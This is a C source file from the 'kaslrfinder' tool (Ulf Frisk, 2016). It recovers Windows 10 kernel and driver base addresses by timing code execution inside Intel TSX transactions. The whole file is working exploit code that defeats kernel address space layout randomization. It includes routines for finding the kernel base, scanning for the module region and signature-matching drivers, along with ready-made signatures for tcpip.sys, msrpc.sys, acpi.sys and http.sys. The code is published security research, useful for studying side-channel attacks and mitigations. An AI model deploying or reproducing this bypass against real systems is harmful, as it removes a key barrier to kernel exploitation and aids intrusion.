// kaslrfinder_c.c : c code to recover KASLR values on Windows
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, kaslrfinder@frizk.net
//
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>

#define SIGNATURE_NX    0x8000

// Definitions of assembly functions below:
uint64_t measure_threshold_16();
bool is_tsx_support();
bool measure_x(uint64_t a, uint64_t threshold);
void loop_eternal();
void speedup();

// Dynamically imported functions below:
int(*printf)(char*, ...);

// Noticed that detection became much more stable if dummy operations could be
// carried out. Just looping doesn't seem to be enough; but this works... just
// like magic :)
void Dummy()
{
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
	SetConsoleCursorPosition(hConsole, consoleInfo.dwCursorPosition);
}

// Measure the timing of the execute operation in a TSX context. If measurement
// indicates executable code in at least two of three cases true is returned.
bool MeasureX_3(uint64_t a, uint64_t th)
{
	int i, c = 0;
	for(i = 0; i < 3; i++) {
		Dummy();
		c += measure_x(a, th) ? 1 : 0;
		if(i == 1 && c != 1) {
			return c > 1;
		}
	}
	return c > 1;
}

// Locate the Windows 10 kernel by probing the TSX timing of code execution. At
// the time of writing the code the Windows 10 version 1607 November 2016 patch
// level the Windows 10 kernel is mapped in 2M pages randomized between adress:
// 0xfffff80000000000 and 0xfffff80400000000. This function detects the base of
// the mapped kernel to a 2M limit.
// The base of the kernel is also randomized within the 2M pages it seems like.
// Randomization have been observed up to 0x00100000 with 0x1000 steps.   If my
// observations are correct this gives 256 possible randomized locations  which
// are not possible to detect by probing execute instructions in a TSX context.
// This attack reduces the total randomization entropy from 8192*256 to 256.
uint64_t FindKernel_2M(uint64_t th)
{
	uint64_t a, i;
	for(a = 0xfffff80000000000; a < 0xfffff80400000000; a += 0x00200000) {
		for(i = 0; i < 3; i++) {
			if(!MeasureX_3(a + i * 0x00200000, th)) {
				break;
			} else if(i == 2) {
				return a;
			}
		}
	}
	return 0;
}

// Create a signature this is used to detect modules by timing code execution.
// The signature is put together by an array of 16-bit values, in which the
// lower 15 bits are the count of 4k-pages with either excute or no execute
// permissions. The highest but is set to 1 if this represents a collection of
// no excute pages, and is set to 0 if the value represents executable pages.
// The output is given in little endian format to make imports easuer.
void CreateModuleSignature(uint64_t th, uint64_t s_base, uint64_t s_size)
{
	uint64_t a;
	uint16_t c;
	bool x, v;
	x = MeasureX_3(s_base, th);
	c = x ? 0 : SIGNATURE_NX;
	printf("Module Signature:      ");
	for(a = s_base; a < s_base + s_size; a += 0x1000) {
		if(x == (v = MeasureX_3(a, th))) {
			c++;
			continue;
		}
		printf("%02x%02x", c & 0xff, (c >> 8) & 0xff);
		x = v;
		c = 1 + (x ? 0 : SIGNATURE_NX);
	}
	printf("%02x%02x\n", c & 0xff, (c >> 8) & 0xff);
}

// Scan forward in 64k chunks to try to find where the modules are randomized.
// Only addresses with 64k contiguous executable sections will be detected, the
// number timing probes are lowered by a factor of 4.  Instead of probing every
// address at 0x10000 offsets between 0xfffff80000000000 and 0xfffff81000000000
// only offsets of 0x40000 are probed.
uint64_t FindModulesBase(int64_t th, uint64_t aKernel)
{
	uint64_t a;
	bool v, x = false;
	for(a = 0xfffff80000000000; a < 0xfffff81000000000; a += 0x00040000) {
		if((a > aKernel) && (a < aKernel + 0x00c00000)) {
			continue;
		}
		v = MeasureX_3(a, th);
		if(x && v) {
			a -= 0x00800000;
			a &= 0xfffffffffff00000;
			return a;
		}
		x = v;
	}
	return 0;
}

// Scan forward in 16k chunks to try find where the module is located.   Layout
// is assumed to first start with a NX page (PE header)  and then an executable
// page. S  ince executable pages are more rare the scan starts by scanning the
// offset + 0x1000 for an executable page regardless of signature.       Once a
// candidate is found at a 0x10000 bondary it is verified against the  supplied
// signature.
// NB! some modules such as win32k are loaded elsewhere in the address space.
// NB! some modules such as hal.dll are not loaded at an even 16k boundary.
uint64_t FindModule(uint64_t th, uint64_t a, uint16_t *sig, uint64_t csig, uint64_t s_base, uint64_t s_size)
{
	uint64_t max, i, j, offset;
	uint16_t c;
	bool x, v;
	for(max = a + 0x200000000; a < max; a += 0x00010000) {
		if(!(x = MeasureX_3(a + 0x1000, th))) {
			continue;
		}
		offset = 0;
		for(i = 0; i < csig; i++) {
			c = sig[i] & ~SIGNATURE_NX;
			x = (sig[i] & SIGNATURE_NX) == 0;
			for(j = 0; j < c; j++) {
				v = MeasureX_3(a + offset, th);
				if(x != v) {
					if(a == s_base) {
						printf("Error: Supplied signature bad.\n");
						CreateModuleSignature(th, s_base, s_size);
					}
					goto next;
				}
				offset += 0x1000;
			}
		}
		return a;
next:
		;
	}
	return 0;
}

// Parse the command line. The options are '-sig <hexascii>' for a signature of
// a module to search for. '-addr 0x<hexascii> -size 0x<hexascii>' for creation
// of a module signature.
void SetupGetArguments(uint64_t* aModuleStart, uint64_t* aModuleSize, uint16_t *sig, uint64_t *csig)
{
	int argc, i = 0;
	*aModuleStart = 0;
	*aModuleSize = 0;
	*csig = 0;
	wchar_t** argv;
	// Dynamically load required functions.
	printf = (int(*)(char*, ...))GetProcAddress(LoadLibraryA("msvcrt.dll"), "printf");
	bool(*_CryptStringToBinaryW)(wchar_t*, uint32_t, uint32_t, uint8_t*, uint32_t*, uint32_t*, uint32_t*) =
		(bool(*)(wchar_t*, uint32_t, uint32_t, uint8_t*, uint32_t*, uint32_t*, uint32_t*))
		GetProcAddress(LoadLibraryA("crypt32.dll"), "CryptStringToBinaryW");
	int(*_wcscmp)(wchar_t *, wchar_t*) =
		(int(*)(wchar_t *, wchar_t*))
		GetProcAddress(LoadLibraryA("msvcrt.dll"), "wcscmp");
	uint64_t(*__wcstoui64)(wchar_t*, wchar_t**, int) =
		(uint64_t(*)(wchar_t*, wchar_t**, int))
		GetProcAddress(LoadLibraryA("msvcrt.dll"), "_wcstoui64");
	wchar_t**(*_CommandLineToArgvW)(wchar_t*, int*) =
		(wchar_t**(*)(wchar_t*, int*))
		GetProcAddress(LoadLibraryA("shell32.dll"), "CommandLineToArgvW");
	// Parse command line.
	argv = _CommandLineToArgvW(GetCommandLineW(), &argc);
	while(argv && i < argc - 1) {
		if(0 == _wcscmp(argv[i], L"-sigbase")) {
			*aModuleStart = __wcstoui64(argv[i + 1], NULL, 16);
			i++;
			continue;
		}
		if(0 == _wcscmp(argv[i], L"-size")) {
			*aModuleSize = __wcstoui64(argv[i + 1], NULL, 16);
			i++;
			continue;
		}
		if(0 == _wcscmp(argv[i], L"-sig")) {
			*csig = 32;
			if(_CryptStringToBinaryW(argv[i + 1], 0, 8, (uint8_t*)sig, (uint32_t*)csig, NULL, NULL)) {
				*csig /= sizeof(uint16_t);
			} else {
				*csig = 0;
			}
			i++;
			continue;
		}
		i++;
	}
}

// Main entry point of the c-part of this program.  Function should be straight
// forward to have a look at. First arguments are grabbed and function required
// are dynamically loaded in 'SetupGetArguments'.   After this the CPU is asked
// TSX is supported (some haswell and newer). If supported a very tight loop is
// called which will push the cpu core to 100%  -  which will force the CPU  to 
// remove any power saving frequency mode that might affect measurements. After
// this an initial measurement value is recorded. AFter this the kernel base is
// detected.   Depending on the options given by the user the program continues
// to search for a specific kernel module/driver  and/or creates a signature of
// one.
void main_c()
{
	uint64_t th, aKernel, aModules, aModule, aSignatureStart, aSignatureSize, csig;
	uint16_t sig[16];
	SetupGetArguments(&aSignatureStart, &aSignatureSize, sig, &csig);
	printf("\n" \
		"kaslrfinder - v1.0         github.com/ufrisk/kaslrfinder\n" \
		"--------------------------------------------------------\n");
	if(csig == 0 && aSignatureStart == 0) {
		printf(
			"Options:                                                \n" \
			" -sig <hexascii> = search for driver using signature.   \n" \
			" -sigbase 0x<hexascii> -size 0x<hexascii> = create a new\n" \
			"  signature with provided module base address and size. \n" \
			"Signatures:            (more signatures found on github)\n" \
			" tcpip.sys:   01809a0155800100          (win10 1607/nov)\n" \
			" msrpc.sys:   0180020016800100          (win10 1607/nov)\n" \
			" acpi.sys:    018062002280              (win10 1607/nov)\n" \
			" http.sys:    01803200df80              (win10 1607/nov)\n" \
			"--------------------------------------------------------\n");
	}
	if(!is_tsx_support()) {
		printf("TSX instruction set not supported on this CPU - exiting.\n");
		return;
	}
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)loop_eternal, NULL, 0, NULL);
	speedup();
	th = measure_threshold_16();
	aKernel = FindKernel_2M(th);
	if(!aKernel) {
		printf("Kernel base address not found. Please try again.\n");
	}
	printf("Address Kernel Base:   %016llx-%016llx\n", aKernel, aKernel + 0x00100000);
	if(aSignatureStart && aSignatureSize) {
		CreateModuleSignature(th, aSignatureStart, aSignatureSize);
	}
	if(csig) {
		aModules = FindModulesBase(th, aKernel);
		printf("Address Modules Above: %016llx\n", aModules);
		aModule = FindModule(th, aModules, sig, csig, aSignatureStart, aSignatureSize);
		printf("Address Module:        %016llx\n", aModule);
	}
}
